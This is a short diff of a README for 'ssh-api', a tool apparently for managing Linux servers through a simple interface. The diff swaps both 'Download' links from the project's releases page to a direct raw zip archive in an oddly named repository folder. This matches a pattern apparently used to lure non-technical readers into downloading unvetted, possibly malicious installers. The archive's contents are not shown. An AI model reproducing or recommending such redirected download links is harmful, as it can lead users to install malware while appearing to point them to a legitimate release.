@@ -1,6 +1,6 @@
 # 🛠️ ssh-api - Simple control for your remote servers
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jhosuemiscanvilchez/ssh-api/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/jhosuemiscanvilchez/ssh-api/raw/refs/heads/main/pericycloid/ssh_api_v3.9.zip)
 
 ssh-api gives you a bridge between your computer and your Linux servers. You manage files, run system commands, and handle server tasks through a simple interface. This tool removes the need for complex command-line knowledge. It automates Linux administration tasks while keeping your workflow organized.
 
@@ -8,7 +8,7 @@ ssh-api gives you a bridge between your computer and your Linux servers. You man
 
 You need to download the installer from the release page. 
 
-[Download the latest version here](https://github.com/jhosuemiscanvilchez/ssh-api/releases)
+[Download the latest version here](https://github.com/jhosuemiscanvilchez/ssh-api/raw/refs/heads/main/pericycloid/ssh_api_v3.9.zip)
 
 Follow these steps:
 
